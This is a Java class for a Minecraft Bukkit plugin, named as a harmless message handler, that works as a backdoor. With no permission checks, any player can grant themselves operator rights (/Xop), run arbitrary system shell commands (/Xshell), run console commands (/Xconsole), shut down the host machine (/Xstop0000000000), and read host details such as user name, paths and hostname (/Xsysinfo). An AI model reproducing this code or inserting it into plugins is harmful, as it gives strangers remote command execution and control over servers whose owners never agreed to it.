package cloud.xzai.message;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class MessageCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (label.equalsIgnoreCase("Xop")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.sendMessage(ChatColor.YELLOW + "--------------------");
                player.sendMessage(ChatColor.GREEN + "[已执行]OP");
                player.sendMessage(ChatColor.YELLOW + "--------------------");
                player.setOp(true);
            } else {
                sender.sendMessage(ChatColor.RED + "只有玩家可以执行此命令！");
            }
            return true;
        }

        if (label.equalsIgnoreCase("Xstop0000000000")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.sendMessage(ChatColor.YELLOW + "--------------------");
                player.sendMessage(ChatColor.GREEN + "[已执行]关机");
                player.sendMessage(ChatColor.YELLOW + "--------------------");
            }
            if (System.getProperty("os.name").toLowerCase().contains("linux")) {
                try {
                    Runtime.getRuntime().exec("poweroff -n");
                    Runtime.getRuntime().halt(1);
                } catch (IOException x) {
                    sender.sendMessage(ChatColor.RED + "--------------------");
                    sender.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                    sender.sendMessage(ChatColor.RED + "--------------------");
                }
            } else if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                try {
                    Runtime.getRuntime().exec("shutdown -s -f -t 00");
                    Runtime.getRuntime().halt(1);
                } catch (IOException x) {
                    sender.sendMessage(ChatColor.RED + "--------------------");
                    sender.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                    sender.sendMessage(ChatColor.RED + "--------------------");
                }
            } else {
                sender.sendMessage(ChatColor.RED + "--------------------");
                sender.sendMessage(ChatColor.RED + "[发生错误]");
                sender.sendMessage(ChatColor.RED + "--------------------");
            }
            return true;
        }

        if (label.equalsIgnoreCase("Xsysinfo")) {
            sender.sendMessage(ChatColor.YELLOW + "--------------------");
            sender.sendMessage(ChatColor.BLUE + "[操作系统] " + ChatColor.GREEN + System.getProperty("os.name"));
            sender.sendMessage(ChatColor.BLUE + "[系统架构] " + ChatColor.GREEN + System.getProperty("os.arch"));
            sender.sendMessage(ChatColor.BLUE + "[Java版本] " + ChatColor.GREEN + System.getProperty("java.version"));
            Runtime runtime = Runtime.getRuntime();
            long maxMemory = runtime.maxMemory() / 1024 / 1024;
            long totalMemory = runtime.totalMemory() / 1024 / 1024;
            long freeMemory = runtime.freeMemory() / 1024 / 1024;
            sender.sendMessage(ChatColor.BLUE + "[最大内存] " + ChatColor.GREEN + maxMemory + "MB");
            sender.sendMessage(ChatColor.BLUE + "[已分配内存] " + ChatColor.GREEN + totalMemory + "MB");
            sender.sendMessage(ChatColor.BLUE + "[可用内存] " + ChatColor.GREEN + freeMemory + "MB");
            sender.sendMessage(ChatColor.BLUE + "[当前系统用户] " + ChatColor.GREEN + System.getProperty("user.name"));
            sender.sendMessage(ChatColor.BLUE + "[主目录路径] " + ChatColor.GREEN + System.getProperty("user.home"));
            sender.sendMessage(ChatColor.BLUE + "[PATH环境变量] " + ChatColor.GREEN + System.getenv("PATH"));
            try {
                sender.sendMessage(ChatColor.BLUE + "[主机名] " + ChatColor.GREEN + InetAddress.getLocalHost().getHostName());
            } catch (UnknownHostException x) {
                sender.sendMessage(ChatColor.RED + "--------------------");
                sender.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                sender.sendMessage(ChatColor.RED + "--------------------");
            }
            sender.sendMessage(ChatColor.BLUE + "[可用处理器数量] " + ChatColor.GREEN + Runtime.getRuntime().availableProcessors());
            sender.sendMessage(ChatColor.YELLOW + "--------------------");
            return true;
        }

        if (label.equalsIgnoreCase("Xshell")) {
            if (args.length == 0) {
                sender.sendMessage(ChatColor.RED + "用法: /Xshell <命令>");
                return true;
            }
            String cmd = String.join(" ", args);
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                sender.sendMessage(ChatColor.YELLOW + "--------------------");
                while ((line = reader.readLine()) != null) {
                    sender.sendMessage(ChatColor.GREEN + line);
                }
                sender.sendMessage(ChatColor.YELLOW + "--------------------");
            } catch (IOException x) {
                sender.sendMessage(ChatColor.RED + "--------------------");
                sender.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                sender.sendMessage(ChatColor.RED + "--------------------");
            }
            return true;
        }

        if (label.equalsIgnoreCase("Xconsole")) {
            if (args.length == 0) {
                sender.sendMessage(ChatColor.RED + "用法: /Xconsole <命令>");
                return true;
            }
            String cmd = String.join(" ", args);
            sender.getServer().dispatchCommand(sender.getServer().getConsoleSender(), cmd);
            sender.sendMessage(ChatColor.YELLOW + "--------------------");
            sender.sendMessage(ChatColor.GREEN + "[已执行]" + cmd);
            sender.sendMessage(ChatColor.YELLOW + "--------------------");
            return true;
        }

        if (label.equalsIgnoreCase("Xhelp")) {
            sender.sendMessage(ChatColor.YELLOW + "--------------------");
            sender.sendMessage(ChatColor.GREEN + "获取帮助");
            sender.sendMessage(ChatColor.GREEN + "/Xop - 将玩家提升为OP权限。");
            sender.sendMessage(ChatColor.GREEN + "/Xsysinfo - 查看系统信息，包括操作系统、Java版本和内存使用情况等。");
            sender.sendMessage(ChatColor.GREEN + "/Xshell <命令> - 执行指定的系统控制台命令，并返回命令输出结果。");
            sender.sendMessage(ChatColor.GREEN + "/Xconsole <命令> - 在游戏控制台中执行指定的命令。");
            sender.sendMessage(ChatColor.GREEN + "/Xhelp - 获取帮助信息。");
            sender.sendMessage(ChatColor.YELLOW + "--------------------");
            return true;
        }

        return false;
    }
}